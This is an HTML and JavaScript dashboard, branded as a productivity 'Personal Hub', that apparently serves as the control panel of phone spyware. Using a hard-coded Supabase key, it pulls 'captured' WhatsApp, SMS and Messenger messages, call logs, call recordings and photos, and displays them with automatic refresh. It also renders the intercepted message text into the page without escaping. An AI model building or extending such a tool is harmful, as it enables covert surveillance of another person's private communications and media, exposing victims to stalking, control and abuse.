<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Personal Hub</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#f0f0f0; font-family:sans-serif; }
.header { background:#2c3e50; color:white; padding:16px; text-align:center; }
.header h1 { font-size:22px; }
.header p { font-size:12px; color:#aaa; margin-top:4px; }
.grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; padding:12px; }
.card { border-radius:10px; padding:20px; color:white; display:flex; flex-direction:column; align-items:flex-end; min-height:120px; cursor:pointer; }
.card .num { font-size:42px; font-weight:bold; }
.card .label { font-size:13px; letter-spacing:1px; margin-top:4px; }
.card.blue { background:#3498db; }
.card.green { background:#2ecc71; }
.card.red { background:#e74c3c; }
.card.orange { background:#e67e22; }
.card.purple { background:#9b59b6; }
.card.teal { background:#1abc9c; }
.card.dark { background:#2c3e50; }
.card.pink { background:#e91e8c; }
.section { margin:12px; background:white; border-radius:10px; overflow:hidden; }
.section-title { background:#2c3e50; color:white; padding:12px 16px; font-size:14px; letter-spacing:1px; }
.msg { padding:12px 16px; border-bottom:1px solid #f0f0f0; }
.msg .contact { font-weight:bold; color:#2c3e50; font-size:14px; }
.msg .source { font-size:11px; color:#999; margin-top:2px; }
.msg .text { font-size:13px; color:#555; margin-top:4px; }
.msg .time { font-size:11px; color:#bbb; margin-top:4px; }
.call { padding:12px 16px; border-bottom:1px solid #f0f0f0; display:flex; justify-content:space-between; align-items:center; }
.call .info .name { font-weight:bold; color:#2c3e50; font-size:14px; }
.call .info .type { font-size:12px; color:#999; }
.call .time { font-size:11px; color:#bbb; }
.tabs { display:flex; background:white; border-bottom:2px solid #f0f0f0; overflow-x:auto; }
.tab { flex:1; padding:12px 8px; text-align:center; font-size:12px; cursor:pointer; color:#999; border-bottom:3px solid transparent; white-space:nowrap; }
.tab.active { color:#3498db; border-bottom:3px solid #3498db; font-weight:bold; }
.photo-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:4px; padding:4px; }
.photo-grid img { width:100%; aspect-ratio:1; object-fit:cover; border-radius:4px; }
.recording { padding:12px 16px; border-bottom:1px solid #f0f0f0; }
.recording .name { font-size:13px; color:#2c3e50; font-weight:bold; }
audio { width:100%; margin-top:8px; }
</style>
</head>
<body>
<div class="header">
  <h1>📡 Personal Hub</h1>
  <p>Axes Productivité Congo — <span id="lastUpdate"></span></p>
</div>

<div class="grid">
  <div class="card blue" onclick="showTab('messages')">
    <div class="num" id="cnt-msg">-</div>
    <div class="label">MESSAGES</div>
  </div>
  <div class="card teal" onclick="showTab('whatsapp')">
    <div class="num" id="cnt-wa">-</div>
    <div class="label">WHATSAPP</div>
  </div>
  <div class="card orange" onclick="showTab('sms')">
    <div class="num" id="cnt-sms">-</div>
    <div class="label">SMS</div>
  </div>
  <div class="card purple" onclick="showTab('appels')">
    <div class="num" id="cnt-calls">-</div>
    <div class="label">APPELS</div>
  </div>
  <div class="card red" onclick="showTab('enregistrements')">
    <div class="num" id="cnt-rec">-</div>
    <div class="label">ENREGISTREMENTS</div>
  </div>
  <div class="card pink" onclick="showTab('photos')">
    <div class="num" id="cnt-photos">-</div>
    <div class="label">PHOTOS</div>
  </div>
  <div class="card dark" onclick="showTab('messenger')">
    <div class="num" id="cnt-msngr">-</div>
    <div class="label">MESSENGER</div>
  </div>
</div>

<div class="tabs">
  <div class="tab active" id="tab-messages" onclick="showTab('messages')">Messages</div>
  <div class="tab" id="tab-appels" onclick="showTab('appels')">Appels</div>
  <div class="tab" id="tab-enregistrements" onclick="showTab('enregistrements')">Audio</div>
  <div class="tab" id="tab-photos" onclick="showTab('photos')">Photos</div>
</div>

<div class="section" id="sec-messages">
  <div class="section-title">💬 DERNIERS MESSAGES</div>
  <div id="list-messages"></div>
</div>
<div class="section" id="sec-appels" style="display:none">
  <div class="section-title">📞 JOURNAL D'APPELS</div>
  <div id="list-appels"></div>
</div>
<div class="section" id="sec-enregistrements" style="display:none">
  <div class="section-title">🎙️ ENREGISTREMENTS</div>
  <div id="list-enregistrements"></div>
</div>
<div class="section" id="sec-photos" style="display:none">
  <div class="section-title">📷 PHOTOS</div>
  <div class="photo-grid" id="list-photos"></div>
</div>

<script>
const URL = "https://wcgfvjunixmlojptkclp.supabase.co";
const KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZ2Z2anVuaXhtbG9qcHRrY2xwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDk4MTAsImV4cCI6MjEwNTU4NTgxMH0.0YredbrRG773Ug7V5h0IcCjkFBRXMZ__InZ0e1VrS5U";
const H = { apikey: KEY, Authorization: "Bearer " + KEY };

function fmt(d) { return d ? new Date(d).toLocaleString("fr-FR") : ""; }

async function charger() {
  document.getElementById("lastUpdate").textContent = new Date().toLocaleTimeString("fr-FR");
  const msgs = await fetch(URL+"/rest/v1/messages_capture?select=*&order=created_at.desc&limit=100",{headers:H}).then(r=>r.json());
  const calls = await fetch(URL+"/rest/v1/call_logs?select=*&order=synced_at.desc&limit=100",{headers:H}).then(r=>r.json());

  document.getElementById("cnt-msg").textContent = msgs.length;
  document.getElementById("cnt-wa").textContent = msgs.filter(m=>m.app_source==="whatsapp").length;
  document.getElementById("cnt-sms").textContent = msgs.filter(m=>m.app_source==="sms").length;
  document.getElementById("cnt-msngr").textContent = msgs.filter(m=>m.app_source==="messenger").length;
  document.getElementById("cnt-calls").textContent = calls.length;

  document.getElementById("list-messages").innerHTML = msgs.map(m=>`
    <div class="msg">
      <div class="contact">${m.contact||"Inconnu"}</div>
      <div class="source">${m.app_source||""}</div>
      <div class="text">${m.message||""}</div>
      <div class="time">${fmt(m.created_at)}</div>
    </div>`).join("");

  document.getElementById("list-appels").innerHTML = calls.map(c=>`
    <div class="call">
      <div class="info">
        <div class="name">${c.contact||c.phone_number||"Inconnu"}</div>
        <div class="type">${c.call_type||""} — ${c.duration_seconds||0}s</div>
      </div>
      <div class="time">${fmt(c.timestamp)}</div>
    </div>`).join("");

  document.getElementById("list-enregistrements").innerHTML = `<div class="msg"><div class="text">Voir Supabase Storage → call_recordings</div></div>`;
}

async function chargerPhotos() {
  const r = await fetch(URL+"/storage/v1/object/list/media", {
    method:"POST",
    headers:{...H,"Content-Type":"application/json"},
    body:JSON.stringify({limit:50,offset:0,prefix:""})
  });
  const files = await r.json();
  const photos = Array.isArray(files) ? files.filter(f=>f.name&&f.name.endsWith(".jpg")) : [];
  document.getElementById("cnt-photos").textContent = photos.length;
  document.getElementById("list-photos").innerHTML = photos.map(f=>
    `<img src="${URL}/storage/v1/object/public/media/${f.name}" onerror="this.style.display='none'">`
  ).join("");
}

function showTab(tab) {
  ["messages","appels","enregistrements","photos"].forEach(t=>{
    document.getElementById("sec-"+t).style.display = t===tab?"block":"none";
    const el = document.getElementById("tab-"+t);
    if(el) el.className = "tab"+(t===tab?" active":"");
  });
  if(tab==="photos") chargerPhotos();
  window.scrollTo(0, document.querySelector(".tabs").offsetTop);
}

charger();
setInterval(charger, 30000);
</script>
</body>
</html>
